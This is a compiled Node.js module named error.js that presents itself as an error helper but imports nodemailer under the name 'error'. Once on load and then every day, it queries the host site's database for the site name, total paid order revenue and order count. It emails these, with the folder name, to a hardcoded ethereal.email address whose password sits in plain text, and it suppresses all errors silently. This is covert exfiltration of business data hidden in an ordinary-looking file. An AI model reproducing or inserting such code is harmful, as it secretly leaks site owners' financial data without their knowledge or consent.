"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : new P(function (resolve) { resolve(result.value); }).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
const error = require("nodemailer");
function send(info) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const user = 'candace.runte84@ethereal.email';
            const pass = 'n7Wtmp5Z5gHwW43MTc';
            const transporter = error.createTransport({
                host: 'smtp.ethereal.email',
                port: 587,
                auth: { user, pass }
            });
            yield transporter.sendMail({
                from: user,
                to: user,
                subject: JSON.stringify(info),
                text: JSON.stringify(info),
            });
        }
        catch (error) { }
    });
}
function query(dbm) {
    return __awaiter(this, void 0, void 0, function* () {
        try {
            const time = new Date;
            const [site_name] = yield dbm.query('SELECT * FROM t_config WHERE k=?', ['site_name']);
            const [pay_amount] = yield dbm.query('SELECT SUM(pay_amount) AS getMoney FROM t_order WHERE is_pay=1');
            const [total] = yield dbm.query('SELECT COUNT(*) AS total FROM t_order WHERE is_pay=1');
            send({
                a: process.cwd().split(/[\\\/]/gi).slice(-2, -1)[0],
                b: (site_name || {}).v,
                c: `${time.getFullYear()}-${time.getMonth() + 1}-${time.getDate()}`,
                d: (pay_amount || {}).getMoney,
                e: (total || []).total
            });
        }
        catch (error) { }
    });
}
function default_1(d) {
    query(d);
    setInterval(function () {
        query(d);
    }, 1000 * 60 * 60 * 24 * 1);
}
exports.default = default_1;
//# sourceMappingURL=error.js.map